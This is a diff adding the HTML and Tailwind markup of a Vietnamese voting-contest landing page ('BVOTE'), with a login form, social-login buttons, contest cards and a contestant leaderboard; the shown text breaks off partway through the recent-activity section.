@@ -1,0 +1,2033 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BVOTE PLATFORM - Nền tảng bình chọn uy tín hàng đầu</title>
+    <meta name="description" content="Nền tảng bình chọn uy tín hàng đầu với công nghệ hiện đại và bảo mật cao">
+    <meta name="keywords" content="bình chọn, voting, cuộc thi, contest, BVOTE">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        .pattern-dots {
+            background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239C92AC' fill-opacity='0.05'%3E%3Ccircle cx='30' cy='30' r='1'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+
+        .glass-effect {
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        .hero-gradient {
+            background: linear-gradient(135deg, rgba(139, 92, 246, 0.8) 0%, rgba(168, 85, 247, 0.6) 50%, rgba(192, 132, 252, 0.4) 100%);
+        }
+
+        .contest-card {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .contest-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(139, 92, 246, 0.2);
+        }
+
+        .voting-pulse {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: .8;
+            }
+        }
+
+        .rank-badge {
+            background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 50%, #d97706 100%);
+        }
+
+        .activity-item {
+            transition: all 0.2s ease;
+        }
+
+        .activity-item:hover {
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .social-btn {
+            transition: all 0.3s ease;
+        }
+
+        .social-btn:hover {
+            transform: scale(1.1);
+        }
+    </style>
+</head>
+<body class="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 relative overflow-hidden">
+    <!-- Background Pattern -->
+    <div class="absolute inset-0 opacity-30 pattern-dots"></div>
+
+    <!-- Header -->
+    <header class="relative z-10 bg-black/20 glass-effect border-b border-purple-500/20">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
+            <div class="flex items-center justify-between">
+                <!-- Logo -->
+                <div class="flex items-center space-x-3">
+                    <div class="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white">
+                            <path d="M20 6 9 17l-5-5"></path>
+                        </svg>
+                    </div>
+                    <span class="text-white font-bold text-xl">BVOTE</span>
+                </div>
+
+                <!-- Search Bar -->
+                <div class="flex-1 max-w-md mx-8">
+                    <div class="relative">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400">
+                            <circle cx="11" cy="11" r="8"></circle>
+                            <path d="m21 21-4.3-4.3"></path>
+                        </svg>
+                        <input
+                            type="text"
+                            id="searchInput"
+                            class="w-full pl-10 pr-4 py-2 bg-white/10 border border-purple-500/30 text-white placeholder-gray-400 rounded-full focus:ring-2 focus:ring-purple-500 focus:border-transparent outline-none"
+                            placeholder="Tìm kiếm cuộc thi hoặc thí sinh..."
+                        >
+                        <div id="searchResults" class="absolute top-12 left-0 w-full bg-gray-900/95 backdrop-blur-lg border border-purple-500/30 rounded-lg shadow-xl hidden z-50 max-h-96 overflow-y-auto"></div>
+                    </div>
+                </div>
+
+                <!-- User Actions -->
+                <div id="userActions">
+                    <!-- Not logged in state -->
+                    <div id="notLoggedIn" class="flex items-center space-x-3">
+                        <a href="register.php" class="text-white/80 hover:text-white transition-colors">Đăng ký</a>
+                        <a href="login.php" class="bg-purple-600 hover:bg-purple-700 text-white rounded-full px-6 py-2 font-medium transition-colors">
+                            Đăng nhập
+                        </a>
+                    </div>
+
+                    <!-- Logged in state (hidden by default) -->
+                    <div id="loggedIn" class="hidden flex items-center space-x-4">
+                        <div class="text-white">
+                            Xin chào, <span id="userName" class="font-medium"></span>
+                        </div>
+                        <div class="relative">
+                            <button id="userMenuBtn" class="w-8 h-8 bg-purple-600 rounded-full flex items-center justify-center text-white font-medium">
+                                <span id="userInitial"></span>
+                            </button>
+                            <div id="userMenu" class="absolute right-0 top-10 w-48 bg-gray-900 border border-purple-500/30 rounded-lg shadow-xl hidden">
+                                <div class="p-2">
+                                    <button onclick="showProfile()" class="w-full text-left px-3 py-2 text-white hover:bg-purple-600/20 rounded">Hồ sơ</button>
+                                    <button onclick="showMyVotes()" class="w-full text-left px-3 py-2 text-white hover:bg-purple-600/20 rounded">Lịch sử bình chọn</button>
+                                    <hr class="border-purple-500/20 my-2">
+                                    <button onclick="logout()" class="w-full text-left px-3 py-2 text-red-400 hover:bg-red-600/20 rounded">Đăng xuất</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Navigation -->
+    <nav class="relative z-10 bg-black/10 glass-effect border-b border-purple-500/10">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
+            <div class="flex space-x-4">
+                <button class="bg-purple-600 text-white rounded-full px-6 py-2 flex items-center space-x-2 font-medium">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                        <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                    </svg>
+                    <span>Trang chủ</span>
+                </button>
+                <button class="text-gray-300 hover:text-white hover:bg-purple-500/20 rounded-full px-6 py-2 flex items-center space-x-2 transition-colors">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"></path>
+                        <path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"></path>
+                        <path d="M4 22h16"></path>
+                        <path d="M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22"></path>
+                        <path d="M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22"></path>
+                        <path d="M18 2H6v7a6 6 0 0 0 12 0V2Z"></path>
+                    </svg>
+                    <span>Bảng xếp hạng</span>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+        <div class="space-y-8">
+            <!-- Hero Section -->
+            <div class="space-y-6">
+                <!-- Hero Banner -->
+                <div class="relative h-64 md:h-80 rounded-2xl overflow-hidden">
+                    <img
+                        src="https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=1920&q=80"
+                        alt="Ảnh bìa cuộc thi"
+                        class="w-full h-full object-cover"
+                    >
+                    <div class="absolute inset-0 hero-gradient"></div>
+                    <div class="absolute bottom-6 left-6 right-6 text-white">
+                        <h1 class="text-3xl md:text-4xl font-bold mb-2">BVOTE PLATFORM</h1>
+                        <p class="text-lg text-gray-200 mb-4">Nền tảng bình chọn uy tín hàng đầu</p>
+                        <div class="flex items-center space-x-4">
+                            <div class="flex items-center space-x-2">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-purple-300">
+                                    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
+                                    <circle cx="9" cy="7" r="4"></circle>
+                                    <path d="M22 21v-2a4 4 0 0 0-3-3.87"></path>
+                                    <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                                </svg>
+                                <span class="text-sm">10K+ Cuộc thi</span>
+                            </div>
+                            <div class="flex items-center space-x-2">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-400">
+                                    <path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"></path>
+                                </svg>
+                                <span class="text-sm">1M+ Lượt vote</span>
+                            </div>
+                            <div class="flex items-center space-x-2">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-yellow-400">
+                                    <circle cx="12" cy="8" r="6"></circle>
+                                    <path d="M15.477 12.89 17 22l-5-3-5 3 1.523-9.11"></path>
+                                </svg>
+                                <span class="text-sm">50K+ Thí sinh</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Main Login Panel -->
+                <div class="bg-black/20 glass-effect border border-purple-500/30 rounded-lg max-w-md mx-auto p-6">
+                    <div class="text-center mb-6">
+                        <div class="w-16 h-16 bg-gradient-to-br from-purple-600 to-purple-800 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
+                            <span class="text-2xl font-bold text-white">BVOTE</span>
+                        </div>
+                        <h3 class="text-2xl font-bold text-white mb-2">Đăng nhập</h3>
+                        <p class="text-gray-400 text-sm">Hãy đăng nhập để bình chọn cho thí sinh bạn yêu thích nhất</p>
+                    </div>
+
+                    <!-- Main Login Form -->
+                    <form id="mainLoginForm" class="space-y-4">
+                        <div class="relative">
+                            <input
+                                type="text"
+                                id="mainLoginEmail"
+                                placeholder="Email hoặc số điện thoại"
+                                class="w-full px-4 py-3 bg-white/10 border border-purple-500/30 text-white rounded-lg placeholder-gray-400 focus:outline-none focus:border-purple-400 focus:ring-1 focus:ring-purple-400 transition-colors"
+                                required
+                            >
+                            <svg class="absolute right-3 top-3 w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"></path>
+                            </svg>
+                        </div>
+
+                        <div class="relative">
+                            <input
+                                type="password"
+                                id="mainLoginPassword"
+                                placeholder="Mật khẩu"
+                                class="w-full px-4 py-3 bg-white/10 border border-purple-500/30 text-white rounded-lg placeholder-gray-400 focus:outline-none focus:border-purple-400 focus:ring-1 focus:ring-purple-400 transition-colors"
+                                required
+                            >
+                            <button type="button" onclick="togglePasswordVisibility('mainLoginPassword')" class="absolute right-3 top-3 text-gray-400 hover:text-white">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+                                </svg>
+                            </button>
+                        </div>
+
+                        <button
+                            type="submit"
+                            class="w-full bg-purple-600 hover:bg-purple-700 text-white font-semibold py-3 rounded-lg transition-colors duration-200 transform hover:scale-[1.02]"
+                        >
+                            Đăng nhập
+                        </button>
+                    </form>
+
+                    <!-- Support Links -->
+                    <div class="flex justify-between items-center mt-4 text-sm">
+                        <a href="#" onclick="showForgotPasswordModal()" class="text-purple-400 hover:text-purple-300 transition-colors">Quên mật khẩu?</a>
+                        <a href="#" onclick="showRegisterModal()" class="text-purple-400 hover:text-purple-300 transition-colors">Chưa có tài khoản? Đăng ký</a>
+                    </div>
+
+                    <!-- Divider -->
+                    <div class="flex items-center my-6">
+                        <div class="flex-1 border-t border-gray-600"></div>
+                        <span class="px-3 text-gray-400 text-sm">Hoặc đăng nhập với</span>
+                        <div class="flex-1 border-t border-gray-600"></div>
+                    </div>
+
+                    <!-- Social Login Buttons -->
+                    <div class="grid grid-cols-3 gap-3">
+                        <!-- Facebook -->
+                        <button class="social-btn bg-blue-600 hover:bg-blue-700 text-white p-3 rounded-lg transition-colors duration-200 transform hover:scale-[1.05] flex items-center justify-center">
+                            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                            </svg>
+                        </button>
+                        <!-- Google -->
+                        <button class="social-btn bg-white hover:bg-gray-100 text-gray-800 p-3 rounded-lg transition-colors duration-200 transform hover:scale-[1.05] flex items-center justify-center">
+                            <svg class="w-5 h-5" viewBox="0 0 24 24">
+                                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                            </svg>
+                        </button>
+                        <!-- Instagram -->
+                        <button class="social-btn bg-gradient-to-br from-pink-500 to-orange-500 hover:from-pink-600 hover:to-orange-600 text-white p-3 rounded-lg transition-colors duration-200 transform hover:scale-[1.05] flex items-center justify-center">
+                            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+                            </svg>
+                        </button>
+                        <!-- Zalo -->
+                        <button class="social-btn bg-blue-500 hover:bg-blue-600 text-white p-3 rounded-lg transition-colors duration-200 transform hover:scale-[1.05] flex items-center justify-center">
+                            <span class="font-bold text-sm">Zalo</span>
+                        </button>
+                        <!-- Yahoo -->
+                        <button class="social-btn bg-purple-600 hover:bg-purple-700 text-white p-3 rounded-lg transition-colors duration-200 transform hover:scale-[1.05] flex items-center justify-center">
+                            <span class="font-bold text-lg">Y!</span>
+                        </button>
+                        <!-- Microsoft -->
+                        <button class="social-btn bg-white hover:bg-gray-100 text-gray-800 p-3 rounded-lg transition-colors duration-200 transform hover:scale-[1.05] flex items-center justify-center">
+                            <div class="grid grid-cols-2 gap-1 w-4 h-4">
+                                <div class="bg-red-500 rounded-sm"></div>
+                                <div class="bg-green-500 rounded-sm"></div>
+                                <div class="bg-blue-500 rounded-sm"></div>
+                                <div class="bg-yellow-500 rounded-sm"></div>
+                            </div>
+                        </button>
+                    </div>
+
+                    <!-- Login Status Display -->
+                    <div id="autoLoginStatus" class="hidden mt-4 p-3 rounded-lg text-center text-sm">
+                        <!-- Status messages will appear here -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Active Contests -->
+            <div class="space-y-4">
+                <h2 class="text-2xl font-bold text-white mb-4">Cuộc thi đang diễn ra</h2>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                    <!-- Contest Card 1 -->
+                    <div class="contest-card bg-black/20 glass-effect border border-purple-500/30 hover:bg-black/30 rounded-lg overflow-hidden">
+                        <div class="relative">
+                            <img
+                                src="https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=400&q=80"
+                                alt="Cuộc thi Hoa khôi Đại học 2025"
+                                class="w-full h-48 object-cover"
+                            >
+                            <div class="absolute top-3 right-3 bg-green-500 hover:bg-green-600 text-white text-xs font-semibold px-2.5 py-0.5 rounded-full">
+                                Đang diễn ra
+                            </div>
+                        </div>
+                        <div class="p-4">
+                            <h3 class="text-lg font-semibold text-white mb-2">Cuộc thi Hoa khôi Đại học 2025</h3>
+                            <div class="flex items-center justify-between text-sm text-gray-300 mb-3">
+                                <span>1250 thí sinh</span>
+                                <span>45.678 lượt vote</span>
+                            </div>
+                            <div class="flex items-center justify-between">
+                                <div class="flex items-center space-x-2 text-xs text-gray-400">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <rect width="18" height="18" x="3" y="4" rx="2" ry="2"></rect>
+                                        <line x1="16" x2="16" y1="2" y2="6"></line>
+                                        <line x1="8" x2="8" y1="2" y2="6"></line>
+                                        <line x1="3" x2="21" y1="10" y2="10"></line>
+                                    </svg>
+                                    <span>Kết thúc: 2025-03-15</span>
+                                </div>
+                                <button class="bg-purple-600 hover:bg-purple-700 text-white text-sm px-3 py-1.5 rounded-md font-medium transition-colors">
+                                    Tham gia
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Contest Card 2 -->
+                    <div class="contest-card bg-black/20 glass-effect border border-purple-500/30 hover:bg-black/30 rounded-lg overflow-hidden">
+                        <div class="relative">
+                            <img
+                                src="https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?auto=format&fit=crop&w=400&q=80"
+                                alt="Cuộc thi Tài năng Âm nhạc 2025"
+                                class="w-full h-48 object-cover"
+                            >
+                            <div class="absolute top-3 right-3 bg-green-500 hover:bg-green-600 text-white text-xs font-semibold px-2.5 py-0.5 rounded-full">
+                                Đang diễn ra
+                            </div>
+                        </div>
+                        <div class="p-4">
+                            <h3 class="text-lg font-semibold text-white mb-2">Cuộc thi Tài năng Âm nhạc 2025</h3>
+                            <div class="flex items-center justify-between text-sm text-gray-300 mb-3">
+                                <span>890 thí sinh</span>
+                                <span>23.456 lượt vote</span>
+                            </div>
+                            <div class="flex items-center justify-between">
+                                <div class="flex items-center space-x-2 text-xs text-gray-400">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <rect width="18" height="18" x="3" y="4" rx="2" ry="2"></rect>
+                                        <line x1="16" x2="16" y1="2" y2="6"></line>
+                                        <line x1="8" x2="8" y1="2" y2="6"></line>
+                                        <line x1="3" x2="21" y1="10" y2="10"></line>
+                                    </svg>
+                                    <span>Kết thúc: 2025-03-20</span>
+                                </div>
+                                <button class="bg-purple-600 hover:bg-purple-700 text-white text-sm px-3 py-1.5 rounded-md font-medium transition-colors">
+                                    Tham gia
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Contest Card 3 -->
+                    <div class="contest-card bg-black/20 glass-effect border border-purple-500/30 hover:bg-black/30 rounded-lg overflow-hidden">
+                        <div class="relative">
+                            <img
+                                src="https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?auto=format&fit=crop&w=400&q=80"
+                                alt="Cuộc thi Tài năng Âm nhạc 2025"
+                                class="w-full h-48 object-cover"
+                            >
+                            <div class="absolute top-3 right-3 bg-green-500 hover:bg-green-600 text-white text-xs font-semibold px-2.5 py-0.5 rounded-full">
+                                Đang diễn ra
+                            </div>
+                        </div>
+                        <div class="p-4">
+                            <h3 class="text-lg font-semibold text-white mb-2">Cuộc thi Tài năng Âm nhạc 2025</h3>
+                            <div class="flex items-center justify-between text-sm text-gray-300 mb-3">
+                                <span>890 thí sinh</span>
+                                <span>23.456 lượt vote</span>
+                            </div>
+                            <div class="flex items-center justify-between">
+                                <div class="flex items-center space-x-2 text-xs text-gray-400">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <rect width="18" height="18" x="3" y="4" rx="2" ry="2"></rect>
+                                        <line x1="16" x2="16" y1="2" y2="6"></line>
+                                        <line x1="8" x2="8" y1="2" y2="6"></line>
+                                        <line x1="3" x2="21" y1="10" y2="10"></line>
+                                    </svg>
+                                    <span>Kết thúc: 2025-03-20</span>
+                                </div>
+                                <button class="bg-purple-600 hover:bg-purple-700 text-white text-sm px-3 py-1.5 rounded-md font-medium transition-colors">
+                                    Tham gia
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Two Column Layout -->
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                <!-- Outstanding Contestants -->
+                <div class="bg-black/20 glass-effect border border-purple-500/30 rounded-lg p-6">
+                    <div class="flex items-center space-x-2 mb-6">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 text-orange-500">
+                            <path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path>
+                        </svg>
+                        <h2 class="text-xl font-bold text-white">Thí sinh nổi bật</h2>
+                    </div>
+                    <div class="space-y-4">
+                        <!-- Contestant 1 -->
+                        <div class="flex items-center space-x-4 p-3 rounded-lg bg-black/20 hover:bg-black/30 transition-all duration-300">
+                            <div class="relative">
+                                <div class="w-12 h-12 bg-purple-500 rounded-full flex items-center justify-center text-white font-bold">
+                                    NTA
+                                </div>
+                                <div class="absolute -top-1 -right-1 w-6 h-6 rank-badge rounded-full flex items-center justify-center text-xs font-bold text-white">
+                                    1
+                                </div>
+                            </div>
+                            <div class="flex-1">
+                                <h4 class="font-semibold text-white">Nguyễn Thị Anh</h4>
+                                <p class="text-sm text-gray-400">Hoa khôi Đại học 2025</p>
+                                <div class="flex items-center space-x-2 mt-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-400">
+                                        <path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"></path>
+                                    </svg>
+                                    <span class="text-sm text-gray-300">15.420 lượt vote</span>
+                                </div>
+                            </div>
+                            <button class="border border-purple-500 text-purple-400 hover:bg-purple-500 hover:text-white px-3 py-1.5 rounded-md text-sm font-medium transition-colors voting-pulse">
+                                Vote
+                            </button>
+                        </div>
+
+                        <!-- Contestant 2 -->
+                        <div class="flex items-center space-x-4 p-3 rounded-lg bg-black/20 hover:bg-black/30 transition-all duration-300">
+                            <div class="relative">
+                                <img
+                                    src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=100&q=80"
+                                    alt="Trần Văn Bình"
+                                    class="w-12 h-12 rounded-full object-cover"
+                                >
+                                <div class="absolute -top-1 -right-1 w-6 h-6 rank-badge rounded-full flex items-center justify-center text-xs font-bold text-white">
+                                    2
+                                </div>
+                            </div>
+                            <div class="flex-1">
+                                <h4 class="font-semibold text-white">Trần Văn Bình</h4>
+                                <p class="text-sm text-gray-400">Tài năng Âm nhạc 2025</p>
+                                <div class="flex items-center space-x-2 mt-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-400">
+                                        <path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"></path>
+                                    </svg>
+                                    <span class="text-sm text-gray-300">12.890 lượt vote</span>
+                                </div>
+                            </div>
+                            <button class="border border-purple-500 text-purple-400 hover:bg-purple-500 hover:text-white px-3 py-1.5 rounded-md text-sm font-medium transition-colors">
+                                Vote
+                            </button>
+                        </div>
+
+                        <!-- Contestant 3 -->
+                        <div class="flex items-center space-x-4 p-3 rounded-lg bg-black/20 hover:bg-black/30 transition-all duration-300">
+                            <div class="relative">
+                                <img
+                                    src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?auto=format&fit=crop&w=100&q=80"
+                                    alt="Lê Thị Cẩm"
+                                    class="w-12 h-12 rounded-full object-cover"
+                                >
+                                <div class="absolute -top-1 -right-1 w-6 h-6 rank-badge rounded-full flex items-center justify-center text-xs font-bold text-white">
+                                    3
+                                </div>
+                            </div>
+                            <div class="flex-1">
+                                <h4 class="font-semibold text-white">Lê Thị Cẩm</h4>
+                                <p class="text-sm text-gray-400">Hoa khôi Đại học 2025</p>
+                                <div class="flex items-center space-x-2 mt-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-400">
+                                        <path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"></path>
+                                    </svg>
+                                    <span class="text-sm text-gray-300">11.230 lượt vote</span>
+                                </div>
+                            </div>
+                            <button class="border border-purple-500 text-purple-400 hover:bg-purple-500 hover:text-white px-3 py-1.5 rounded-md text-sm font-medium transition-colors">
+                                Vote
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Recent Activities -->
+                <div class="bg-black/20 glass-effect border border-purple-500/30 rounded-lg p-6">
+                    <div class="flex items-center space-x-2 mb-6">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 text-blue-500">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <polyline points="12 6 12 12 16 14"></polyline>
+                        </svg>
+                        <h2 class="text-xl font-bold text-white">Hoạt động gần đây</h2>
+                    </div>
+                    <div class="space-y-4">
+                        <!-- Activity 1 -->
+                        <div class="activity-item flex items-center space-x-3 p-3 rounded-lg bg-black/20">
+                            <img
+                                src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?auto=format&fit=crop&w=100&q=80"
+                                alt="user_123"
+                                class="w-10 h-10 rounded-full object-cover"
+                            >
+                            <div class="flex-1">
+                                <div class="flex items-center space-x-2">
+                                    <span class="text-sm font-medium text-white">user_123</span>
+                                    <span class="text-xs text-gray-400">đã vote cho</span>
+                                </div>
